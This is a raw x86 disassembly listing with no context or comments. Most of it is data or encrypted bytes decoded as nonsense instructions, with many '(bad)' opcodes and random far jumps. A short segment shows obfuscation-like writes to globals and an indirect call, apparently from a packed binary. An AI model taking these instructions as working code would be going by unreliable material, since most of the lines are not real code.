  40f1b8:	sbb    DWORD PTR [ebx+0x31],0x738754d1
  40f1bf:	std    
  40f1c0:	lods   eax,DWORD PTR ds:[esi]
  40f1c1:	mov    dl,0xb3
  40f1c3:	mov    DWORD PTR [ecx+0xc],0xfa98e094
  40f1ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1cb:	cld    
  40f1cc:	dec    esp
  40f1cd:	das    
  40f1ce:	mov    ds:0x4f94ccf1,eax
  40f1d3:	mov    BYTE PTR [edx],ah
  40f1d5:	sbb    BYTE PTR [ebx],0x34
  40f1d8:	fsubr  DWORD PTR [ebp-0x22ceb1c]
  40f1de:	(bad)  
  40f1df:	iret   
  40f1e0:	ja     0x40f214
  40f1e2:	push   edx
  40f1e3:	sub    ebp,DWORD PTR [edx]
  40f1e5:	sub    BYTE PTR [ebp-0x5e],0xbd
  40f1e9:	fld    TBYTE PTR [edx-0x4b943018]
  40f1ef:	rcpps  xmm0,XMMWORD PTR [edi-0x5463296f]
  40f1f6:	test   eax,0x7b0e13b
  40f1fb:	jbe    0x40f188
  40f1fd:	push   ebx
  40f1fe:	or     esi,ebx
  40f200:	nop
  40f201:	jns    0x40f1d7
  40f203:	xor    al,0xf1
  40f205:	push   0x8a0cf21c
  40f20a:	pop    eax
  40f20b:	mov    ah,0x65
  40f20d:	outs   dx,BYTE PTR ds:[esi]
  40f20e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f20f:	push   esp
  40f210:	leave  
  40f211:	mov    DWORD PTR [edi],esi
  40f213:	aad    0xb
  40f215:	call   0x56ac:0xe3e423a7
  40f21c:	inc    edi
  40f21d:	dec    ecx
  40f21e:	dec    ebp
  40f21f:	outs   dx,BYTE PTR ds:[esi]
  40f220:	fcom   QWORD PTR [ebp-0x5eb86a13]
  40f226:	xor    DWORD PTR [ebx+ecx*4-0x78],0xffffff88
  40f22b:	mov    esi,0x1531a478
  40f230:	sbb    ecx,DWORD PTR [edi-0x65e5738]
  40f236:	push   esp
  40f237:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f238:	mov    fs,WORD PTR [ebx-0x6e]
  40f23b:	(bad)  
  40f23d:	ins    DWORD PTR es:[edi],dx
  40f23e:	cli    
  40f23f:	sti    
  40f240:	and    DWORD PTR [ecx-0x58],esp
  40f243:	inc    edx
  40f244:	jp     0x40f212
  40f246:	jg     0x40f2c3
  40f248:	or     al,0xbc
  40f24a:	leave  
  40f24b:	pop    ebp
  40f24c:	pop    esp
  40f24d:	test   DWORD PTR [ebp-0x57aca275],0xe8880d02
  40f257:	sub    esp,DWORD PTR [edi]
  40f259:	dec    ebx
  40f25a:	push   ds
  40f25b:	jno    0x40f1fe
  40f25d:	js     0x40f2d8
  40f25f:	mov    eax,0x5580903e
  40f264:	dec    edx
  40f265:	icebp  
  40f266:	jle    0x40f2c3
  40f268:	cwde   
  40f269:	or     eax,0x838b94b9
  40f26e:	or     al,0x9
  40f270:	int3   
  40f271:	push   eax
  40f272:	mov    ah,0x43
  40f274:	(bad)  
  40f276:	call   0x30391559
  40f27b:	ss call 0xf9426a4e
  40f281:	or     eax,esi
  40f283:	jnp    0x40f28d
  40f285:	dec    ecx
  40f286:	jno    0x40f20b
  40f288:	aas    
  40f289:	and    cl,bl
  40f28b:	icebp  
  40f28c:	jl     0x40f2d4
  40f28e:	int    0x29
  40f290:	(bad)  
  40f291:	in     al,dx
  40f292:	cmp    DWORD PTR [ecx-0x1d6f4741],eax
  40f298:	fdivp  st(5),st
  40f29a:	in     al,dx
  40f29b:	adc    ebp,DWORD PTR [edi]
  40f29d:	imul   esp,DWORD PTR [ecx-0x51a674e2],0x35554144
  40f2a7:	icebp  
  40f2a8:	mov    esp,0x1670dbe0
  40f2ad:	iret   
  40f2ae:	ror    BYTE PTR [esi+0x7555c005],cl
  40f2b4:	mov    WORD PTR [esi+0x403fa046],es
  40f2ba:	lods   al,BYTE PTR ds:[esi]
  40f2bb:	sub    eax,0x63eddc6f
  40f2c0:	jnp    0x40f329
  40f2c2:	cmp    eax,0xa70e6d51
  40f2c7:	sub    ebx,DWORD PTR [edi]
  40f2c9:	(bad)  
  40f2ca:	mov    eax,0xa2d4b24b
  40f2cf:	push   ebp
  40f2d0:	jl     0x40f32f
  40f2d2:	mov    esi,0x709c3503
  40f2d7:	ins    BYTE PTR es:[edi],dx
  40f2d8:	std    
  40f2d9:	pushf  
  40f2da:	fwait
  40f2db:	mov    al,ds:0xbf018359
  40f2e0:	or     al,0x74
  40f2e2:	cwde   
  40f2e3:	imul   esi,esp,0xffffffc5
  40f2e6:	cmc    
  40f2e7:	dec    ecx
  40f2e8:	xchg   esp,eax
  40f2e9:	fbstp  TBYTE PTR [ebx+esi*2-0x3a]
  40f2ed:	lods   al,BYTE PTR ds:[esi]
  40f2ee:	mov    eax,ds:0x3b31b8a7
  40f2f3:	xchg   esi,eax
  40f2f4:	jp     0x40f322
  40f2f6:	mov    dl,0x81
  40f2f8:	or     dl,dh
  40f2fa:	call   0xacc775a1
  40f2ff:	ror    DWORD PTR [esi+0x70],1
  40f302:	mov    edx,0x71dc993f
  40f307:	jne    0x40f314
  40f309:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f30a:	pop    esp
  40f30b:	sub    eax,0xe906eed3
  40f311:	ins    DWORD PTR es:[edi],dx
  40f312:	pop    edi
  40f313:	xchg   edx,eax
  40f314:	in     eax,dx
  40f315:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f316:	inc    esi
  40f317:	popf   
  40f318:	pushf  
  40f319:	nop
  40f31a:	call   0xaf57:0xe12aa84c
  40f321:	adc    al,0xb8
  40f323:	in     eax,dx
  40f324:	mov    eax,ds:0x54670cd8
  40f329:	xor    BYTE PTR [eax-0x49],bh
  40f32c:	bound  ebp,QWORD PTR [eax+0x48]
  40f32f:	ror    DWORD PTR [edi-0x68],1
  40f332:	pop    ss
  40f333:	or     al,0x3
  40f335:	in     eax,dx
  40f336:	aas    
  40f337:	mov    ah,0xa2
  40f339:	out    0x7a,al
  40f33b:	lods   eax,DWORD PTR ds:[esi]
  40f33c:	(bad)  
  40f33d:	iret   
  40f33e:	call   0x933cd07d
  40f343:	cdq    
  40f344:	push   cs
  40f345:	fcmovnbe st,st(6)
  40f347:	fsub   st(0),st
  40f349:	mov    dh,0x2e
  40f34b:	xchg   DWORD PTR [eax],ebx
  40f34d:	jno    0x40f325
  40f34f:	jp     0x40f33e
  40f351:	(bad)  
  40f353:	pop    edi
  40f354:	es pop ebp
  40f356:	je     0x40f38b
  40f358:	shr    DWORD PTR [eax],0x64
  40f35b:	jne    0x40f39d
  40f35d:	les    ebp,FWORD PTR [esp+ebp*8+0xa579ffa]
  40f364:	call   0x6ded:0xf6614091
  40f36b:	scas   eax,DWORD PTR es:[edi]
  40f36c:	std    
  40f36d:	cwde   
  40f36e:	dec    esp
  40f36f:	vmptrst QWORD PTR [ebx+ecx*4+0x29530d98]
  40f377:	or     DWORD PTR [edx+0xa],esp
  40f37a:	mov    al,0x2b
  40f37c:	test   DWORD PTR [edx+0x2c898699],eax
  40f382:	hlt    
  40f383:	cmovnp eax,DWORD PTR [edi+0xa15989e]
  40f38a:	jne    0x40f30d
  40f38c:	les    edi,FWORD PTR [edi]
  40f38e:	mov    ebp,0x71c1fabd
  40f393:	lods   al,BYTE PTR ds:[esi]
  40f394:	(bad)  
  40f395:	lahf   
  40f396:	retf   
  40f397:	adc    al,0x53
  40f399:	sub    eax,0xc18c630f
  40f39e:	in     al,0xd6
  40f3a0:	sar    BYTE PTR es:[ecx+ebp*1],0x33
  40f3a5:	pop    ss
  40f3a6:	inc    esp
  40f3a7:	mov    dh,0x3d
  40f3a9:	ins    BYTE PTR es:[edi],dx
  40f3aa:	jg     0x40f3ff
  40f3ac:	jo     0x40f3fe
  40f3ae:	add    BYTE PTR [edi+ebp*2+0xe78f8a9],dl
  40f3b5:	add    al,0x6d
  40f3b7:	ficomp DWORD PTR [edx+0x79]
  40f3ba:	mov    WORD PTR [edx],?
  40f3bc:	ss (bad) 
  40f3be:	stc    
  40f3bf:	cmp    al,BYTE PTR [edx]
  40f3c1:	adc    ecx,DWORD PTR [edx-0x400f6867]
  40f3c7:	mov    DWORD PTR [edx],ebp
  40f3c9:	add    dh,ah
  40f3cb:	pop    ebx
  40f3cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f3cd:	or     bh,BYTE PTR [esi+0xe76302d]
  40f3d3:	jecxz  0x40f448
  40f3d5:	std    
  40f3d6:	(bad)  
  40f3d8:	push   ebp
  40f3d9:	(bad)  
  40f3da:	sbb    ebp,DWORD PTR [ebp-0x8]
  40f3dd:	dec    ebx
  40f3de:	jmp    0x40f366
  40f3e0:	icebp  
  40f3e1:	rcl    BYTE PTR [edi-0x1d],1
  40f3e4:	or     al,0x8d
  40f3e6:	jmp    0x5d17:0xf7804dca
  40f3ed:	push   0xd9601813
  40f3f2:	mov    es,WORD PTR ss:[ebx+0x2a]
  40f3f6:	loop   0x40f476
  40f3f8:	scas   al,BYTE PTR es:[edi]
  40f3f9:	push   DWORD PTR [ebx+0x4f]
  40f3fc:	dec    eax
  40f3fd:	sbb    BYTE PTR [eax+eax*8],ah
  40f400:	out    0xc7,al
  40f402:	mov    esp,0x5f26cda7
  40f407:	push   gs
  40f409:	in     eax,0x39
  40f40b:	xlat   BYTE PTR ds:[ebx]
  40f40c:	cmp    bh,0x28
  40f40f:	scas   al,BYTE PTR es:[di]
  40f411:	sbb    DWORD PTR [ebx-0x3606c6af],ecx
  40f417:	adc    bh,BYTE PTR [esi+0x64e6b52a]
  40f41d:	cmp    eax,0xdc905c4b
  40f422:	lea    edi,[ebp-0x38]
  40f425:	sbb    al,0x11
  40f427:	sub    DWORD PTR [ebx+0x6692b779],ecx
  40f42d:	test   DWORD PTR [ecx],ebx
  40f42f:	daa    
  40f430:	ins    DWORD PTR es:[edi],dx
  40f431:	mov    BYTE PTR [edi+0x2e10c268],al
  40f437:	push   edx
  40f438:	test   DWORD PTR [eax-0x54fbcb3a],ebp
  40f43e:	sti    
  40f43f:	pop    esi
  40f440:	inc    esp
  40f441:	pop    esp
  40f442:	stos   BYTE PTR es:[edi],al
  40f443:	sar    DWORD PTR [esi+0x12],cl
  40f446:	fucom  st(5)
  40f448:	mov    eax,ds:0x2fbf926
  40f44d:	sub    al,0xc6
  40f44f:	retf   
  40f450:	ror    dh,0xf7
  40f453:	aas    
  40f454:	jno    0x40f470
  40f456:	scas   al,BYTE PTR es:[edi]
  40f457:	sti    
  40f458:	retf   0xb8d0
  40f45b:	sahf   
  40f45c:	hlt    
  40f45d:	int    0xbd
  40f45f:	ja     0x40f4d5
  40f461:	scas   eax,DWORD PTR es:[edi]
  40f462:	xchg   edx,eax
  40f463:	dec    eax
  40f464:	inc    ecx
  40f465:	cmp    al,0xc3
  40f467:	adc    eax,0xa1fd5594
  40f46c:	push   esi
  40f46d:	xchg   esi,eax
  40f46e:	inc    ebx
  40f46f:	mov    esi,DWORD PTR [edi-0x18]
  40f472:	out    dx,al
  40f473:	cmp    ah,BYTE PTR [eax-0x3ad1a3cf]
  40f479:	hlt    
  40f47a:	pop    ss
  40f47b:	iret   
  40f47c:	dec    esp
  40f47d:	test   DWORD PTR [ebp+eax*2+0x57],ebx
  40f481:	nop
  40f482:	out    0x28,al
  40f484:	pop    ds
  40f485:	test   al,dh
  40f487:	std    
  40f488:	add    esi,DWORD PTR ds:0xd2ce18d3
  40f48e:	and    ch,dl
  40f490:	mov    esp,0x981f2ace
  40f495:	add    bh,ah
  40f497:	test   al,0x51
  40f499:	inc    esp
  40f49a:	aam    0xc6
  40f49c:	jmp    0x493e:0x998a8edc
  40f4a3:	adc    eax,0xec99409c
  40f4a8:	adc    eax,0x732e73ef
  40f4ad:	mov    WORD PTR [eax-0x1fcff12d],?
  40f4b3:	push   eax
  40f4b4:	das    
  40f4b5:	sub    al,0xc0
  40f4b7:	mov    ds:0xfce9e8e6,al
  40f4bc:	push   ecx
  40f4bd:	sub    al,0xaf
  40f4bf:	jle    0x40f453
  40f4c1:	scas   eax,DWORD PTR es:[edi]
  40f4c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f4c3:	push   ss
  40f4c4:	mov    bl,0x90
  40f4c6:	retf   
  40f4c7:	sbb    al,0xdb
  40f4c9:	mov    bh,0xa4
  40f4cb:	mov    al,0x28
  40f4cd:	dec    edx
  40f4ce:	add    eax,eax
  40f4d0:	and    DWORD PTR [edx-0x7ab80638],eax
  40f4d6:	out    0xe4,eax
  40f4d8:	sub    DWORD PTR [ecx],esp
  40f4da:	add    eax,0xcb8d21c6
  40f4df:	lds    ebx,FWORD PTR [ecx-0x3cad38a0]
  40f4e5:	mov    ah,0xa1
  40f4e7:	inc    edi
  40f4e8:	das    
  40f4e9:	in     eax,0xcb
  40f4eb:	shl    BYTE PTR [ebp+0x39b85151],1
  40f4f1:	test   DWORD PTR [eax+edi*8+0x36fc45c7],ebx
  40f4f8:	test   DWORD PTR [eax+edi*8+0x457b05c7],ebx
  40f4ff:	inc    ebx
  40f500:	add    BYTE PTR [eax+0x56000036],ah
  40f506:	mov    ecx,DWORD PTR ds:0x43458b
  40f50c:	mov    DWORD PTR [ebp-0x8],eax
  40f50f:	mov    ecx,DWORD PTR [ebp+0x8]
  40f512:	mov    DWORD PTR ds:0x434553,0x6a14
  40f51c:	push   edi
  40f51d:	mov    DWORD PTR ds:0x43457f,0x48b4
  40f527:	mov    edi,0x7510851
  40f52c:	mov    DWORD PTR ds:0x4344bf,0x7e06
  40f536:	mov    esi,0x327299
  40f53b:	mov    DWORD PTR ds:0x43450b,0x7203
  40f545:	cmp    ecx,eax
  40f547:	je     0x40fd56
  40f54d:	or     eax,eax
  40f54f:	jmp    0x40f8e2
  40f554:	cmc    
  40f555:	pop    esp
  40f556:	inc    ebp
  40f557:	gs ins DWORD PTR es:[edi],dx
  40f559:	jge    0x40f550
  40f55b:	pop    esp
  40f55c:	push   0xffffffac
  40f55e:	add    ah,BYTE PTR [esi-0x2c]
  40f561:	sub    al,0x2c
  40f563:	mov    ds,WORD PTR [esi-0xb81814f]
  40f569:	jns    0x40f5e9
  40f56b:	jle    0x40f503
  40f56d:	sbb    al,0x4c
  40f56f:	mov    ecx,0x8f0b7d75
  40f574:	xor    esi,DWORD PTR [edx+0x43]
  40f577:	pop    ebx
  40f578:	sbb    eax,0x82c5c247
  40f57d:	mov    WORD PTR fs:[edi],cs
  40f580:	pop    esp
  40f581:	adc    eax,0x9d7b909f
  40f586:	or     DWORD PTR [edx+0x79],ecx
  40f589:	(bad)  
  40f58a:	call   0xbd0938c1
  40f58f:	ja     0x40f58d
  40f591:	pop    ds
  40f592:	sbb    edi,esi
  40f594:	mov    ds,WORD PTR [esi]
  40f596:	popf   
  40f597:	(bad)  
  40f598:	jge    0x5668522c
  40f59e:	(bad)  
  40f59f:	inc    DWORD PTR [ebp-0x3f]
  40f5a2:	retf   
  40f5a3:	stc    
  40f5a4:	aas    
  40f5a5:	sbb    esi,DWORD PTR [edx]
  40f5a7:	test   eax,0x339a74a0
  40f5ac:	push   ebx
  40f5ad:	mov    eax,ds:0x31d5cf65
  40f5b2:	imul   ecx,DWORD PTR [edx],0x9d31b776
  40f5b8:	sti    
  40f5b9:	push   eax
  40f5ba:	mov    ecx,0x2922e0a1
  40f5bf:	and    esp,DWORD PTR [edx]
  40f5c1:	mov    ss,WORD PTR [edi]
  40f5c3:	inc    ebx
  40f5c4:	jo     0x40f625
  40f5c6:	xor    BYTE PTR [ebp+0x9],ah
  40f5c9:	fisttp WORD PTR [edx]
  40f5cb:	push   ebx
  40f5cc:	xor    BYTE PTR [eax+0x45067ae0],dh
  40f5d2:	fdivr  st,st(6)
  40f5d4:	inc    eax
  40f5d5:	push   esp
  40f5d6:	jmp    0x58fd:0x1b481b37
  40f5dd:	jnp    0x40f639
  40f5df:	in     al,dx
  40f5e0:	mov    ch,0x8c
  40f5e2:	imul   eax,DWORD PTR [esi+0x38253c50],0xfffffff2
  40f5e9:	mov    cl,0xc8
  40f5eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f5ec:	add    al,0xac
  40f5ee:	jbe    0x40f5dd
  40f5f0:	(bad)  
  40f5f1:	in     al,0xa6
  40f5f3:	jp     0x40f603
  40f5f5:	pop    ebp
  40f5f6:	lea    ebp,[ebx+0x68]
  40f5f9:	mov    dh,0x8f
  40f5fb:	add    al,ah
  40f5fd:	(bad)  
  40f5fe:	repz mov dl,0x57
  40f601:	stos   DWORD PTR es:[edi],eax
  40f602:	push   0x4846963b
  40f607:	push   0xc5678c75
  40f60c:	sub    BYTE PTR [esi],bl
  40f60e:	js     0x40f657
  40f610:	ss mov esi,0xb5537a19
  40f616:	dec    edx
  40f617:	xor    dl,cl
  40f619:	sub    eax,0xf4b39307
  40f61e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f61f:	xor    al,0x86
  40f621:	sti    
  40f622:	adc    eax,0x1f3a5e4c
  40f627:	pop    esp
  40f628:	cdq    
  40f629:	in     al,dx
  40f62a:	loop   0x40f5c5
  40f62c:	test   edx,esi
  40f62e:	shr    BYTE PTR [esi-0x79],0x38
  40f632:	popf   
  40f633:	scas   al,BYTE PTR es:[edi]
  40f634:	ins    BYTE PTR es:[edi],dx
  40f635:	inc    esi
  40f636:	push   0xffffffb3
  40f638:	add    DWORD PTR [si-0x3b],0x4694e965
  40f640:	push   ds
  40f641:	mov    WORD PTR [ecx-0x31d9ef29],fs
  40f647:	push   eax
  40f648:	mov    bh,0xd1
  40f64a:	push   esp
  40f64b:	push   ecx
  40f64c:	out    dx,eax
  40f64d:	jne    0x40f663
  40f64f:	daa    
  40f650:	loope  0x40f5e6
  40f652:	pop    ebx
  40f653:	mov    dl,BYTE PTR [edx+0x6a]
  40f656:	adc    esi,DWORD PTR [esi]
  40f658:	ins    DWORD PTR es:[edi],dx
  40f659:	retf   
  40f65a:	inc    esi
  40f65b:	lahf   
  40f65c:	sub    al,0x8e
  40f65e:	mov    al,0x8e
  40f660:	in     al,0xe2
  40f662:	in     eax,dx
  40f663:	pop    ebp
  40f664:	call   0x1c92d538
  40f669:	pop    esp
  40f66a:	mov    eax,ds:0xa8fc9392
  40f66f:	inc    edi
  40f670:	and    al,0x1a
  40f672:	cmovb  esi,eax
  40f675:	mov    esp,0x8a6e1426
  40f67a:	aad    0x32
  40f67c:	rol    DWORD PTR [eax-0xd],cl
  40f67f:	fs dec ebx
  40f681:	or     BYTE PTR [eax],ah
  40f683:	cdq    
  40f684:	ret    0x1a76
  40f687:	mov    al,0x4d
  40f689:	mov    ds:0x6c28847f,eax
  40f68e:	popa   
  40f68f:	jmp    0x40f613
  40f691:	sahf   
  40f692:	pop    eax
  40f693:	(bad)  
  40f694:	clc    
  40f695:	data16 jbe 0x40f67d
  40f698:	jmp    0x28fa:0x97d54c12
  40f69f:	pushf  
  40f6a0:	dec    ecx
  40f6a1:	mov    bh,0xe2
  40f6a3:	lds    eax,FWORD PTR [ecx]
  40f6a5:	sub    DWORD PTR [ecx],esi
  40f6a7:	mov    edi,DWORD PTR [ebx+0x23e46182]
  40f6ad:	lock loop 0x40f63d
  40f6b0:	mov    ch,0x7
  40f6b2:	cmp    BYTE PTR [eax-0x54ea5e3b],dh
  40f6b8:	lods   eax,DWORD PTR ds:[esi]
  40f6b9:	xchg   edx,eax
  40f6ba:	pop    esp
  40f6bb:	int3   
  40f6bc:	aaa    
  40f6bd:	stos   BYTE PTR es:[edi],al
  40f6be:	xchg   esi,ebp
  40f6c0:	gs jae 0x40f6e1
  40f6c3:	out    dx,eax
  40f6c4:	mov    al,ds:0x70a1bc78
  40f6c9:	fs fild WORD PTR ss:[eax+0x68002888]
  40f6d1:	mov    edi,0xbe972ae
  40f6d6:	jb     0x40f66d
  40f6d8:	(bad)  
  40f6d9:	mov    edx,0x14c774e
  40f6de:	loope  0x40f6e7
  40f6e0:	test   DWORD PTR [esi+0x19],ecx
  40f6e3:	test   BYTE PTR [esi+0x52],dl
  40f6e6:	mov    edx,0xb2786a77
  40f6eb:	mov    ch,0x2c
  40f6ed:	cmp    dl,BYTE PTR [eiz*1-0x1fe35578]
  40f6f4:	xchg   edi,eax
  40f6f5:	pop    eax
  40f6f6:	lods   al,BYTE PTR ds:[esi]
  40f6f7:	scas   eax,DWORD PTR es:[edi]
  40f6f8:	mov    al,ds:0x220b5935
  40f6fd:	fnsave [edi-0x7245230a]
  40f703:	cs pushf 
  40f705:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f706:	dec    esi
  40f707:	scas   al,BYTE PTR es:[edi]
  40f708:	cmp    ch,BYTE PTR [eax]
  40f70a:	cld    
  40f70b:	leave  
  40f70c:	mov    bh,0xfb
  40f70e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f70f:	mov    ds:0x1caeb3a6,eax
  40f714:	jle    0x40f76e
  40f716:	cmp    al,0xde
  40f718:	sbb    BYTE PTR [ebp-0x1a5fb1da],dh
  40f71e:	jp     0x40f765
  40f720:	div    BYTE PTR ds:0x77cfee4e
  40f726:	mov    dl,0xee
  40f728:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f729:	enter  0xa1b9,0xde
  40f72d:	(bad)  
  40f72e:	sub    BYTE PTR [ebx+eax*2+0x758a6758],al
  40f735:	jge    0x40f7a3
  40f737:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f738:	xchg   edx,eax
  40f739:	add    ecx,DWORD PTR [ebp+edi*2+0x52]
  40f73d:	into   
  40f73e:	jo     0x40f6eb
  40f740:	adc    al,bl
  40f742:	int    0x29
  40f744:	ja     0x40f79e
  40f746:	addr16 shl dh,0xac
  40f74a:	cmp    DWORD PTR [ebp-0x52],edx
  40f74d:	test   DWORD PTR [ecx+0x1a29cadd],ecx
  40f753:	mov    eax,ds:0xa149d0a4
  40f758:	std    
  40f759:	xor    eax,0x61f6ce9b
  40f75e:	inc    esp
  40f75f:	mov    cl,0x52
  40f761:	jmp    0x40f75d
  40f763:	les    ecx,FWORD PTR [ebx-0x7f]
  40f766:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f767:	push   edx
  40f768:	cld    
  40f769:	mov    DWORD PTR [ebp-0x54beebd1],esp
  40f76f:	pop    ecx
  40f770:	std    
  40f771:	mov    bh,0x82
  40f773:	jmp    0x40f7af
  40f775:	clc    
  40f776:	jge    0x40f7a2
  40f778:	jmp    0x12fe030e
  40f77d:	jbe    0x40f7c6
  40f77f:	es popf 
  40f781:	add    ebx,DWORD PTR [esp+edx*8+0x11]
  40f785:	mov    eax,DWORD PTR [edi]
  40f787:	inc    edi
  40f788:	setns  bh
  40f78b:	and    al,0x6a
  40f78d:	and    DWORD PTR [ebx+0x31],esi
  40f790:	or     dl,BYTE PTR [eax-0x645093]
  40f796:	aad    0x76
  40f798:	iret   
  40f799:	pop    edi
  40f79a:	retf   0x6590
  40f79d:	gs jge 0x40f7e9
  40f7a0:	hlt    
  40f7a1:	int    0xb9
  40f7a3:	cmp    ebx,DWORD PTR [esp+ebx*2]
  40f7a6:	mov    eax,0xb185c009
  40f7ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f7ac:	cmp    BYTE PTR cs:[edx+esi*1-0x2d2850b9],bh
  40f7b4:	stos   BYTE PTR es:[edi],al
  40f7b5:	sbb    DWORD PTR [edx],ebx
  40f7b7:	shl    DWORD PTR [ebx-0x77f7037f],0x63
  40f7be:	pop    es
  40f7bf:	das    
  40f7c0:	adc    eax,0xd45caea3
  40f7c5:	or     al,0xea
  40f7c7:	call   0x2d2a4ef2
  40f7cc:	push   ecx
  40f7cd:	arpl   WORD PTR ds:0xae36b49d,sp
  40f7d3:	call   0xb9c0:0xe5e98e14
  40f7da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f7db:	inc    ebp
  40f7dc:	lods   al,BYTE PTR ds:[esi]
  40f7dd:	sub    bl,dh
  40f7df:	mov    cl,ah
  40f7e1:	mov    dl,0xbf
  40f7e3:	add    ebx,esi
  40f7e5:	fidiv  DWORD PTR [ebx+0x57a055be]
  40f7eb:	add    edx,DWORD PTR [ebx-0x7e]
  40f7ee:	xchg   BYTE PTR [esi],al
  40f7f0:	scas   eax,DWORD PTR es:[edi]
  40f7f1:	iret   
  40f7f2:	mov    edx,0xd9a1fd74
  40f7f7:	fdivr  st,st(2)
  40f7f9:	in     eax,dx
  40f7fa:	mov    esi,0xc771f565
  40f7ff:	pop    eax
  40f800:	stos   BYTE PTR es:[edi],al
  40f801:	repz in eax,dx
  40f803:	and    eax,0x9cbf8cfe
  40f808:	shl    BYTE PTR [ebx+0xa],1
  40f80b:	jbe    0x40f7c8
  40f80d:	dec    esi
  40f80e:	call   0xbc1c:0xc5b1d9d2
  40f815:	inc    edx
  40f816:	sbb    ecx,esp
  40f818:	adc    eax,0x39ee065
  40f81d:	mov    ah,0x3d
  40f81f:	sub    cl,BYTE PTR [eax-0x70]
  40f822:	xlat   BYTE PTR ds:[ebx]
  40f823:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f824:	xor    esp,esp
  40f826:	js     0x40f899
  40f828:	cs gs dec ebp
  40f82b:	aad    0x26
  40f82d:	bswap  edx
  40f82f:	cmp    eax,DWORD PTR [eax]
  40f831:	ss icebp 
  40f833:	aaa    
  40f834:	cmp    BYTE PTR [eax+0x6b],bh
  40f837:	jo     0x40f7e5
  40f839:	xor    dl,BYTE PTR [ecx]
  40f83b:	imul   esi,DWORD PTR [edx],0xffffff9f
  40f83e:	pop    esi
  40f83f:	cmp    eax,0x44b2172e
  40f844:	pop    es
  40f845:	jne    0x40f7d1
  40f847:	repnz and bh,BYTE PTR [ebp-0x49]
  40f84b:	or     al,0xa8
  40f84d:	bnd jo 0x40f898
  40f850:	aaa    
  40f851:	inc    esi
  40f852:	mov    ebx,0xe540bc93
  40f857:	jns    0x40f89e
  40f859:	enter  0xbeab,0xe1
  40f85d:	add    dl,0x56
  40f860:	repnz pop eax
  40f862:	popf   
  40f863:	(bad)  
  40f864:	cmp    BYTE PTR [ebx-0x2f],dl
  40f867:	out    dx,al
  40f868:	daa    
  40f869:	and    al,0xc
  40f86b:	mov    bh,0x50
  40f86d:	cld    
  40f86e:	sbb    ebp,DWORD PTR [eax-0x3914fbdf]
  40f874:	fcmovne st,st(7)
  40f876:	jecxz  0x40f864
  40f878:	lock pop edi
  40f87a:	call   0x10eba05b
  40f87f:	xor    eax,0xa9f9b263
  40f884:	pop    esp
  40f885:	inc    edi
  40f886:	and    eax,0x94858c94
  40f88b:	popf   
  40f88c:	mov    WORD PTR [edx-0x6714b10d],?
  40f892:	inc    edx
  40f893:	add    DWORD PTR [esi],ecx
  40f895:	stos   BYTE PTR es:[edi],al
  40f896:	jle    0x40f8c5
  40f898:	xlat   BYTE PTR ds:[ebx]
  40f899:	cmp    esi,DWORD PTR [ecx]
  40f89b:	sbb    esp,DWORD PTR [ecx]
  40f89d:	dec    esp
  40f89e:	push   eax
  40f89f:	retf   
  40f8a0:	mov    BYTE PTR [edi-0x285dffc4],0xd9
  40f8a7:	cld    
  40f8a8:	xor    DWORD PTR [esi+0x18],0xffffffb2
  40f8ac:	imul   eax,esi,0x4222c0e7
  40f8b2:	mov    edx,0xe7a2eba
  40f8b7:	push   edx
  40f8b8:	jecxz  0x40f89e
  40f8ba:	cmp    cl,bh
  40f8bc:	mov    cl,0x31
  40f8be:	mov    edx,0x961a501d
  40f8c3:	shl    BYTE PTR [edx+0x32479e12],1
  40f8c9:	sub    eax,0x5c1989fe
  40f8ce:	int    0x44
  40f8d0:	mov    edx,ebp
  40f8d2:	scas   al,BYTE PTR es:[edi]
  40f8d3:	lods   al,BYTE PTR ds:[esi]
  40f8d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8d5:	mov    al,0x4
  40f8d7:	dec    edi
  40f8d8:	cmp    al,0xfb
  40f8da:	sbb    BYTE PTR [ebp+0x46],ch
  40f8dd:	imul   DWORD PTR [ecx+edx*2-0x34]
  40f8e1:	add    al,0x8b
  40f8e3:	inc    ebp
  40f8e4:	cld    
  40f8e5:	mov    ecx,DWORD PTR [ebp+0xc]
  40f8e8:	xor    DWORD PTR ds:0x4344bf,0x43454f
  40f8f2:	xor    eax,edi
  40f8f4:	add    eax,esi
  40f8f6:	mov    DWORD PTR ds:0x43450b,0x4bab
  40f900:	cmp    eax,ecx
  40f902:	mov    DWORD PTR ds:0x43458f,0x3e53
  40f90c:	je     0x40fd56
  40f912:	and    DWORD PTR ds:0x434513,edi
  40f918:	mov    eax,DWORD PTR [ebp-0x4]
  40f91b:	mov    edx,DWORD PTR ds:0x43446b
  40f921:	xor    DWORD PTR ds:0x4344d3,edx
  40f927:	xor    eax,edi
  40f929:	and    DWORD PTR ds:0x43453f,0x0
  40f933:	mov    edx,DWORD PTR ds:0x43453f
  40f939:	inc    edx
  40f93a:	mov    DWORD PTR ds:0x43453f,edx
  40f940:	cmp    DWORD PTR ds:0x43453f,0x9
  40f947:	jne    0x40f96a
  40f94d:	push   0x4344cb
  40f952:	push   0x434612
  40f957:	push   0x7b5f
  40f95c:	push   0x5aad
  40f961:	push   DWORD PTR [ebp-0xc]
  40f964:	call   DWORD PTR ds:0x4132a4
  40f96a:	cmp    DWORD PTR ds:0x43453f,0x8
  40f971:	jne    0x40f986
  40f977:	xor    edx,edx
  40f979:	xor    edx,DWORD PTR ds:0x43453f
  40f97f:	inc    edx
  40f980:	mov    DWORD PTR ds:0x43453f,edx
